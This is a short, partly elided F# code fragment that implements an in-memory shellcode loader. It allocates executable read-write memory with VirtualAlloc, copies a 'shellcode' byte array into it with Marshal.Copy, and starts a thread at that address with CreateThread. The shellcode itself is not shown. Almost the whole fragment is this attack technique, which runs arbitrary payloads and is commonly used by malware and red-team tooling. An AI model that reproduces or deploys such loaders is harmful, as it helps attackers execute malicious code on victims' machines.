...
let main argv =
    ...
    let mutable lpThreadId:uint32 = 
        uint32 0
    let mutable mem:IntPtr = 
        VirtualAlloc(IntPtr.Zero, UIntPtr(uint32 shellcode.Length), MEM_COMMIT, PAGE_EXECUTE_READWRITE)

    Marshal.Copy(shellcode, 0, mem, shellcode.Length)

    let mutable thread:IntPtr = 
        CreateThread(IntPtr.Zero, zero, mem, IntPtr.Zero, zero, &lpThreadId)
